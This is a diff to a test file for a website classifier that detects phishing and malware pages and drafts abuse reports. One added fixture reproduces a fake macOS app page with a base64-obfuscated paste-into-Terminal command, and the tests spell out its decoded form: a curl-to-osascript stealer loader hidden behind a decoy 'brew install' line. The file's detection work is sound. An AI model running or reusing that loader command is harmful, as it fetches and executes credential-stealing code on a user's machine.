@@ -11,6 +11,7 @@ import {
 	websiteSiteAssessments,
 } from "./website_ai";
 import { capturedDocumentContent } from "./website_archive";
+import { extractPasteCommands } from "./malware/paste_commands";
 import type { WebsiteNavigationHop } from "./website_types";
 
 const shareGoogleHop: WebsiteNavigationHop = {
@@ -169,15 +170,16 @@ test("classification receives only one exact site's captured evidence", () => {
 	expect(() => buildWebsiteClassificationInput(shareGoogleHop, redirectArchive)).toThrow("exact navigation hop");
 });
 
-test("classification covers lures and malware delivery and lists fields beyond the HTML excerpt", () => {
+test("classification covers lures and malware and lists fields beyond the HTML excerpt", () => {
 	const input = buildWebsiteClassificationInput(tiktokCoinKitHop, tiktokCoinKitArchive);
 	const system = input[0].content as string;
 	const text = (input[1].content as Array<{ text: string }>)[0]!.text;
 
 	expect(system).toContain("any language");
 	expect(system).toContain("A lure page that only leads to that step counts");
-	expect(system).toContain("malware_delivery when it pushes the visitor to download, install, or run");
+	expect(system).toContain("Return malware when the page gets the visitor to download, install, or run");
 	expect(system).toContain("asks to paste a command");
+	expect(system).not.toContain("malware_delivery");
 	expect(tiktokCoinKitArchive.html.toString("utf-8").indexOf("phone-card-code")).toBeGreaterThan(12_000);
 	expect(text).toContain("data_entry_fields[4]{ref,control,id,name,autocomplete,label,placeholder}:");
 	expect(text).toContain('f3,"input[type=text]",phone-card-code,null,off,Mã thẻ,Nhập mã thẻ');
@@ -185,7 +187,8 @@ test("classification covers lures and malware delivery and lists fields beyond t
 	expect(text).not.toContain("bank-transfer");
 	expect(WEBSITE_CLASSIFICATION_FORMAT.schema).toMatchObject({
 		properties: {
-			phishingBasis: { enum: ["credential_theft", "payment_fraud", "malware_delivery", "none"] },
+			finding: { enum: ["phishing", "malware", "benign", "prank_or_troll", "insufficient_evidence"] },
+			phishingBasis: { enum: ["credential_theft", "payment_fraud", "none"] },
 			collectionFieldRefs: { type: "array", items: { type: "string" } },
 		},
 		required: ["finding", "phishingBasis", "evidenceQuote", "collectionFieldRefs"],
@@ -212,13 +215,13 @@ test("a lure page that only leads to a sign-in step is reportable without data-e
 	expect(reportablePage(appleAccountLure, classification)).toEqual(appleAccountLure.hop);
 });
 
-test("pages that push a download or a pasted command are reportable as malware delivery", () => {
-	const update = classify(fakeChromeUpdate, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Your version of Chrome is out of date and can no longer display this page." });
-	expect(update).toEqual({ finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Your version of Chrome is out of date and can no longer display this page." });
+test("pages that push a download or a pasted command are reportable as malware", () => {
+	const update = classify(fakeChromeUpdate, { finding: "malware", phishingBasis: "none", evidenceQuote: "Your version of Chrome is out of date and can no longer display this page." });
+	expect(update).toEqual({ finding: "malware", evidenceQuote: "Your version of Chrome is out of date and can no longer display this page." });
 	expect(reportablePage(fakeChromeUpdate, update)).toEqual(fakeChromeUpdate.hop);
 
-	const command = classify(fakeCaptchaCommand, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Appuyez sur Windows + R\nAppuyez sur Ctrl + V" });
-	expect(command).toEqual({ finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Appuyez sur Windows + R Appuyez sur Ctrl + V" });
+	const command = classify(fakeCaptchaCommand, { finding: "malware", phishingBasis: "none", evidenceQuote: "Appuyez sur Windows + R\nAppuyez sur Ctrl + V" });
+	expect(command).toEqual({ finding: "malware", evidenceQuote: "Appuyez sur Windows + R Appuyez sur Ctrl + V" });
 	expect(reportablePage(fakeCaptchaCommand, command)).toEqual(fakeCaptchaCommand.hop);
 });
 
@@ -243,7 +246,7 @@ test("a quote spanning several page lines keeps its text and drops the line brea
 	});
 	expect(validateTikTokKit(["f3"], "Mã thẻ\u0007")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "its evidence quote contains no page text",
+		rejectedClaim: "its evidence quote contains no page text",
 	});
 });
 
@@ -255,19 +258,19 @@ test("a quote joining separate page lines is evidence when each line is verbatim
 		"Google Chrome 网络浏览器\n得益于 Google 的智能工具，Chrome 现在更易用、更安全、更快捷。\n下载 Chrome\n适用于 Windows 11/10 64-bit",
 		"<a href=\"#download\">下载 Chrome</a>",
 	);
-	const classification = classify(page, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Google Chrome 网络浏览器\n下载 Chrome" });
-	expect(classification).toEqual({ finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Google Chrome 网络浏览器 … 下载 Chrome" });
+	const classification = classify(page, { finding: "malware", phishingBasis: "none", evidenceQuote: "Google Chrome 网络浏览器\n下载 Chrome" });
+	expect(classification).toEqual({ finding: "malware", evidenceQuote: "Google Chrome 网络浏览器 … 下载 Chrome" });
 	expect(reportablePage(page, classification)).toEqual(page.hop);
 
 	// One invented line still makes the whole quote invented.
-	expect(classify(page, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Google Chrome 网络浏览器\n立即安装更新" })).toEqual({
+	expect(classify(page, { finding: "malware", phishingBasis: "none", evidenceQuote: "Google Chrome 网络浏览器\n立即安装更新" })).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "its evidence quote does not appear verbatim in the captured page text",
+		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
 	});
 	// Each line must carry page text of its own, not only punctuation found anywhere.
-	expect(classify(page, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Google Chrome 网络浏览器\n。" })).toEqual({
+	expect(classify(page, { finding: "malware", phishingBasis: "none", evidenceQuote: "Google Chrome 网络浏览器\n。" })).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "its evidence quote does not appear verbatim in the captured page text",
+		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
 	});
 });
 
@@ -332,19 +335,19 @@ test("phishing claims without a harmful action or verbatim page evidence are not
 	expect(validateWebsiteSiteClassification({ finding: "prank_or_troll", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [] }, "You got trolled. Fuck you!", "<html></html>")).toEqual({ finding: "prank_or_troll" });
 	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "unrelated fabricated evidence", collectionFieldRefs: ["f1"] }, "You got trolled. Fuck you!", "<html><form><input type=\"password\"></form></html>")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "its evidence quote does not appear verbatim in the captured page text",
+		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
 	});
 	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "password asks to verify the unrelated account credentials".repeat(10), collectionFieldRefs: ["f1"] }, "password asks to verify the unrelated account credentials", "<html><form><input type=\"password\"></form></html>")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "its evidence quote does not appear verbatim in the captured page text",
+		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
 	});
 	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "!", collectionFieldRefs: [] }, "Sign in!", "<input type=\"password\">")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "its evidence quote contains no page text",
+		rejectedClaim: "its evidence quote contains no page text",
 	});
 	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "none", evidenceQuote: "You got trolled. Fuck you!", collectionFieldRefs: [] }, "You got trolled. Fuck you!", "<html></html>")).toEqual({
 		finding: "insufficient_evidence",
-		rejectedPhishingClaim: "it named no credential theft, payment fraud, or malware delivery",
+		rejectedClaim: "it named no credential theft or payment fraud",
 	});
 	expect(() => validateWebsiteSiteClassification({ finding: "suspicious", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [] }, "page text", "<html></html>")).toThrow("invalid finding");
 	expect(() => validateWebsiteSiteClassification({ finding: "benign", phishingBasis: "none", evidenceQuote: "" }, "page text", "<html></html>")).toThrow("collection field references");
@@ -426,7 +429,7 @@ test("the report handoff states the verified finding as plain sentences, not the
 	const lure = classify(appleAccountLure, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: appleLureQuote });
 	const evidence = buildWebsiteReportEvidence(lure);
 	expect(evidence.split("\n")).toEqual([
-		"The page asks visitors for a password, sign-in details, a verification code, or identity details, or leads them to a step that does.",
+		"The page impersonates a trusted brand and asks visitors for a password, sign-in details, a verification code, or identity details, or leads them to a step that does.",
 		`Page text that shows it, in its original language: ${JSON.stringify(appleLureQuote)}.`,
 	]);
 	expect(evidence).not.toContain("<html");
@@ -441,6 +444,85 @@ test("the report handoff states the verified finding as plain sentences, not the
 	expect(narrate(buildWebsiteReportEvidence({ finding: "phishing" }))).toBeUndefined();
 	expect(narrate(evidence)).toContain("a login or credential-collection flow");
 
-	const update = classify(fakeChromeUpdate, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Update Chrome" });
-	expect(narrate(buildWebsiteReportEvidence(update))).toContain("malicious content");
+	const update = classify(fakeChromeUpdate, { finding: "malware", phishingBasis: "none", evidenceQuote: "Update Chrome" });
+	expect(buildWebsiteReportEvidence(update)).toContain("The page distributes malware");
+	const malwareNarrative = buildProviderReportNarrative({
+		provider: "cloudflare",
+		allegationCategory: "malware",
+		target: fakeChromeUpdate.hop.hostname,
+		observedUrls: [fakeChromeUpdate.hop.url],
+		description: buildWebsiteReportEvidence(update),
+		maximumLength: 1_000,
+	});
+	expect(malwareNarrative).toContain("suspected malware distribution URL");
+	expect(malwareNarrative).toContain("The page distributes malware");
+	expect(malwareNarrative).not.toContain("phishing");
+});
+
+// Production case 375628583143477248: paneo.work, an invented macOS app site. Its
+// "Download for macOS" button opens an install dialog at the very end of the page
+// whose command decodes to a curl | osascript stealer loader. The classifier only
+// saw the first 10,000 characters and called the page benign.
+const paneoInstallCommand = `: "brew install --cask paneo" && echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL29nWmhNSkI3RjI3NyB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
+const paneo = capturedPage(
+	"https://paneo.work/",
+	[
+		"Paneo — Window Manager for macOS Power Users",
+		"Download for macOS",
+		...Array.from({ length: 400 }, (_, index) => `Feature ${index}: every layout arranges itself across every monitor.`),
+		"Install Paneo",
+		"1 Open Terminal",
+		"2 Run the install command",
+		`${paneoInstallCommand} Copy command`,
+		"Paste into Terminal and press Return.",
+	].join("\n"),
+	"<html><body><a href=\"#download\" data-conversion=\"download\">Download for macOS</a></body></html>",
+);
+
+test("the classifier reads the whole page and the decoded install command, not a 10,000-character prefix", () => {
+	expect(paneo.archive.text.toString("utf-8").indexOf("Install Paneo")).toBeGreaterThan(12_000);
+	const analysis = buildWebsiteAnalysisInput({ ...paneo.archive });
+	const analysisText = (analysis[1].content as Array<{ text?: string }>)[0]!.text!;
+	expect(analysisText).toContain("2 Run the install command");
+	expect(analysisText).toContain("curl -sfL https://keychainagent.pro/wksxgj/ogZhMJB7F277 | osascript -l JavaScript");
+	expect(analysisText).toContain("distributes malware");
+
+	const classification = buildWebsiteClassificationInput(paneo.hop, { ...paneo.archive });
+	const system = classification[0].content as string;
+	const user = (classification[1].content as Array<{ text: string }>)[0]!.text;
+	expect(system).toContain("Return malware when");
+	expect(system).toContain("The brand on a malware page may be invented");
+	expect(user).toContain("Install Paneo");
+	expect(user).toContain("payload_urls");
+	expect(user).toContain("https://keychainagent.pro/wksxgj/ogZhMJB7F277");
+	expect(user).toContain("brew install --cask paneo");
+});
+
+test("an invented-brand app site with a pasted stealer command is reported as malware with the decoded command", () => {
+	const finding = classify(paneo, { finding: "malware", phishingBasis: "none", evidenceQuote: paneoInstallCommand });
+	expect(finding).toEqual({ finding: "malware", evidenceQuote: paneoInstallCommand });
+	expect(reportablePage(paneo, finding)).toEqual(paneo.hop);
+
+	const evidence = buildWebsiteReportEvidence(finding, extractPasteCommands(paneo.archive.text.toString("utf-8")));
+	expect(evidence.split("\n")).toEqual([
+		"The page distributes malware: it gets visitors to download, install, or run something that harms them.",
+		`Page text that shows it, in its original language: ${JSON.stringify(paneoInstallCommand)}.`,
+		`The page tells visitors to paste and run this command: ${JSON.stringify(paneoInstallCommand)}.`,
+		`Decoded, it runs: "curl -sfL https://keychainagent.pro/wksxgj/ogZhMJB7F277 | osascript -l JavaScript".`,
+		`It shows "brew install --cask paneo" so the visitor believes a legitimate install is running.`,
+		"It downloads and runs code from: https://keychainagent.pro/wksxgj/ogZhMJB7F277.",
+	]);
+});
+
+test("a malware claim needs a verbatim quote and phishing never carries a malware basis", () => {
+	expect(classify(paneo, { finding: "malware", phishingBasis: "none", evidenceQuote: "Run this to get infected" })).toEqual({
+		finding: "insufficient_evidence",
+		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
+	});
+	expect(classify(paneo, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Install Paneo" })).toEqual({
+		finding: "insufficient_evidence",
+		rejectedClaim: "it named no credential theft or payment fraud",
+	});
+	// A malware finding names no phishing basis even if the model sends one.
+	expect(classify(paneo, { finding: "malware", phishingBasis: "credential_theft", evidenceQuote: "Install Paneo" })).toEqual({ finding: "malware", evidenceQuote: "Install Paneo" });
 });
